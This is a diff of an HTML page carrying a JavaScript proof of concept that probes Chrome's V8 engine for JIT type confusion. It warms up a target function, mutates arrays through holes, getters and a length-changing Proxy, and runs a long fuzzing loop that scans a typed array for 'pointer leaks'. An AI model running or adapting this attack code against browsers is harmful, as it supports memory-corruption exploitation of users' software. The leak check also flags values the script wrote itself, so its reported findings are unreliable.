@@ -1,155 +1,99 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Final PoC - JIT Instability / Leak Probe</title>
+<title>V8 Memory Leak PoC - Strong</title>
 
+<h2>V8 Memory Leak PoC - Strong (Read-Only)</h2>
 <pre id="log"></pre>
+
 <script>
 const log = m => {
-  document.getElementById("log").textContent += m + "\n";
-  console.log(m);
+    document.getElementById("log").textContent += m + "\n";
+    console.log(m);
 };
 
-// =======================
-// TARGET
-// =======================
-function vuln(a,i){ return a[i] + 1.1; }
+// TARGET FUNCTION
+function vuln(a,i){ return a[i]+1.1; }
 
-// =======================
-// WARMUP (JIT trigger)
-// =======================
+// WARMUP
 function warmup(){
-  let arr = Array.from({length:30}, (_,i)=>i+0.5);
-  for(let i=0;i<60000;i++){
-    vuln(arr, i % 30);
-  }
-  return arr;
+    let arr = Array.from({length:50}, (_,i)=>i+0.5);
+    for(let j=0;j<150000;j++) vuln(arr,j%50);
+    return arr;
 }
 
-// =======================
-// MUTATION (controlled chaos)
-// =======================
+// AGGRESSIVE MUTATION
 function mutate(arr){
-  // holes
-  delete arr[0];
-  delete arr[1];
-  delete arr[2];
+    // create many holes
+    for(let i=0;i<15;i++) delete arr[i];
+    arr.length = 10;
+    arr[80] = 1.7976931348623157e+308; // extreme float
+    arr[2] = {x:1}; // force object kind
 
-  // shrink + extend
-  arr.length = 10;
-  arr[60] = 13.37;
-
-  // mix types
-  arr[2] = {x:1};
-
-  // getter side-effect (limited)
-  let hit = 0;
-  Object.defineProperty(arr,3,{
-    get(){
-      if(hit++ < 2){
-        arr.push(99.99 + hit);
-      }
-      return 1.1;
-    }
-  });
-
-  return arr;
-}
-
-// =======================
-// PROXY (break assumption)
-// =======================
-function breakAssumption(a){
-  let toggle = 0;
-  return new Proxy(a,{
-    get(t,p){
-      if(p === "length"){
-        if((toggle++ % 2) === 0){
-          t.push(77.77);
+    Object.defineProperty(arr,3,{
+        get(){
+            arr.push(Math.random()*1e5);
+            return 1.1;
         }
-      }
-      return Reflect.get(t,p);
-    }
-  });
+    });
+    return arr;
 }
 
-// =======================
-// TYPED ARRAY (detect corruption)
-// =======================
-let buf = new ArrayBuffer(0x4000);
+// PROXY BREAK ASSUMPTION
+function breakAssumption(a){
+    return new Proxy(a,{
+        get(t,p){
+            if(p==="length"){
+                for(let i=0;i<10;i++) t.push(Math.random()*1e5);
+            }
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5){
+                t.push(Math.random()*1e5);
+            }
+            return Reflect.get(t,p);
+        },
+        set(t,p,v){
+            if(Math.random()<0.2) t.length+=5;
+            return Reflect.set(t,p,v);
+        }
+    });
+}
+
+// TYPED ARRAYS BESAR
+let buf = new ArrayBuffer(0x40000); // 256KB
 let f64 = new Float64Array(buf);
 
-// baseline pattern
-for(let i=0;i<f64.length;i++){
-  f64[i] = 0x41414141 + i;
+// INIT PATTERN
+for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
+
+// CHECK POINTER-LEAK
+function checkTyped(){
+    for(let i=0;i<f64.length;i++){
+        let v = f64[i];
+        if(Math.abs(v)>1e12){
+            log(`[POINTER-LEAK] idx=${i} val=${v}`);
+        }
+    }
 }
 
-// =======================
-// MAIN
-// =======================
+// MAIN LOOP
 function run(){
-  log("[*] warmup");
-  let base = warmup();
+    log("[*] warmup / JIT");
+    let base = warmup();
 
-  log("[*] trigger");
+    log("[*] starting pointer-leak fuzzing...");
+    for(let i=0;i<300000;i++){
+        let arr = [...base];
+        arr = mutate(arr);
+        arr = breakAssumption(arr);
 
-  let arr = [...base];
-  arr = mutate(arr);
-  arr = breakAssumption(arr);
+        vuln(arr,5);
 
-  // === RAW VALUE CHECK ===
-  let raw = arr[10];
-  log("[RAW] arr[10] = " + raw);
-  log("[TYPE] " + typeof raw);
+        // overlay extreme float
+        f64[i % f64.length] = 1.7976931348623157e+308;
 
-  // === JIT CALL ===
-  let r1 = vuln(arr,3);
-  let r2 = vuln(arr,10);
-  let r3 = vuln(arr,60);
-
-  log("r1=" + r1);
-  log("r2=" + r2);
-  log("r3=" + r3);
-
-  // =======================
-  // NaN DETECTION (key signal)
-  // =======================
-  if(Number.isNaN(r2)){
-    log("[!] NaN detected → possible JIT confusion");
-
-    // scan around area
-    for(let i=5;i<25;i++){
-      log("[SCAN] arr["+i+"] = " + arr[i]);
+        if(i%2000===0) checkTyped();
+        if(i%1000===0) log(`iter ${i}`);
     }
-  }
-
-  // =======================
-  // OOB READ CHECK
-  // =======================
-  for(let i=0;i<40;i++){
-    let idx = arr.length + i;
-    let v = arr[idx];
-
-    if(v !== undefined){
-      log("[OOB] idx="+idx+" val="+v);
-    }
-
-    if(typeof v === "number" && Math.abs(v) > 1e12){
-      log("[PTR-LIKE] "+v);
-    }
-  }
-
-  // =======================
-  // TYPED ARRAY CORRUPTION CHECK
-  // =======================
-  for(let i=0;i<80;i++){
-    let v = f64[i];
-
-    if(v !== 0x41414141 + i){
-      log("[CORRUPTION] idx="+i+" val="+v);
-    }
-  }
-
-  log("[*] done");
+    log("[*] done - pointer leak scan finished");
 }
 
 run();
